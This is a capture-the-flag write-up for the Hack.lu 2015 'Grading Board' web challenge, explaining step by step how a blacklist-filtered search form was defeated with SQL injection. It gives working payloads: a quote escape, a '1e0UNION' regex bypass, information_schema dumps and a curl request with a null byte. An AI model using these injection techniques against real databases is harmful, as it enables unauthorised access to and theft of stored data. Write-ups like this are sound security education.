#Hack.lu 2015 Grading Board [web] 300

#Problem
You are sitting in your computer science class and are already done with your assignment (well, who would have guessed that). But you know that even though you did a perfect job (obviously) your teacher will give you a shitty grade because he can't stand your face.<br>
Well well well, it is time to put your skills on the table and show that son of a ... (you know the word I am looking for)... who the boss is. Thanks to the Ashley Madison dump and the stupidity of your teacher (seriously, how can he even teach the class...) you got the login credentials to the grading board.<br>
But, unlucky for you, your shithead of class mate found a vulnerability inside the website and went all whitehat on that shit and reported it (believe me I know ....in a different world...), he was also tasked to improve the security of the system.<br>
Fortunately for you, he left his phone unlocked and unattended, which allowed you to forward yourself the email containing the patch for the website, .... end to end encryption out of the window right there....,<br>
Alright son, get your shit together and let's get cracking<br>

Here is the [patch](https://school.fluxfingers.net/static/chals/patch_953dc87b784435d237b33a4f2fc20612.diff)!<br>
And the [Website](https://school.fluxfingers.net:1506/)

The login credentials are:<br>
Username: kdavis<br>
Password: trolo!Fool<br>

##Solution
The website is divided into two parts: search and login.<br>
![github](https://github.com/st9140927/writeup/blob/master/Hack.lu CTF 2015/Grading Board [web] 300/1.png)<br>
![github](https://github.com/st9140927/writeup/blob/master/Hack.lu CTF 2015/Grading Board [web] 300/2.png)

The account for signing in is given in the problem description. After login, the website will ask for token.<br>
![github](https://github.com/st9140927/writeup/blob/master/Hack.lu CTF 2015/Grading Board [web] 300/3.png)

After taking a short look at the patch file, I saw following SQL syntax:
<pre>
<code>
select id, first_name, last_name from students
WHERE first_name='$name'
   OR last_name='$name' ORDER BY id ASC LIMIT 5;
</code>
</pre>

And the blacklist replaced **'**, **"**, **/** and ***** , So it was possible to use '**#\**' to escape the single quote. The SQL syntax would become:
<pre>
<code>
select id, first_name, last_name from students
            WHERE first_name='<SQLi>#\' OR last_name='<SQLi>#\' ORDER BY id ASC LIMIT 5;
</code>
</pre>

<br>After trying "**OR 1=1 #\**" as input, the SQLi worked.<br>
![github](https://github.com/st9140927/writeup/blob/master/Hack.lu CTF 2015/Grading Board [web] 300/4.png)

Also, the patch tried to disable union SQLi by regex: [^a-zA-Z0-9\_]union[^a-zA-Z0-9\_]<br>
But we still have some ways to bypass the limitation.<br>
[Union Bypass Reference](https://github.com/client9/libinjection/blob/master/data/sqli-rsalgado-bhusa2013.txt)<br>
In the reference, it showed that SQL syntax still worked with content "OR 1=1**e0**Union...". We could use this trick to bypass the above limitation.<br>

In the patch, it told us how the table name was generated and all the column names we had in the table, but it was also easy to use information\_schema to get all the information we needed. Just entered following input:
<pre><code>
AND 1=1e0UNION SELECT table_schema, table_name, column_name FROM information_schema.columns#\
</code></pre>

![github](https://github.com/st9140927/writeup/blob/master/Hack.lu CTF 2015/Grading Board [web] 300/5.png)<br>
The table name and column name were there!<br>

And then we entered following input:
<pre><code>
AND 1=1e0UNION SELECT 1, 2, token FROM t608f2cde509866e#\
</code></pre>

![github](https://github.com/st9140927/writeup/blob/master/Hack.lu CTF 2015/Grading Board [web] 300/6.png)

After summiting the token, I got the flag. :)<br>
![github](https://github.com/st9140927/writeup/blob/master/Hack.lu CTF 2015/Grading Board [web] 300/flag.png)

<br>
Note:<br>
It's also able to bypass the limit of "LIMIT 5" by using null byte. We can modify our input as following and use curl to send our post request:
<pre><code>
curl -X POST --data "name=AND 1=1e0union select table_schema, table_name, column_name FROM information_schema.columns;%00\&site=default&action=search" https://school.fluxfingers.net:1506/
</code></pre>
And you can get the whole results instead of 5 columns only.

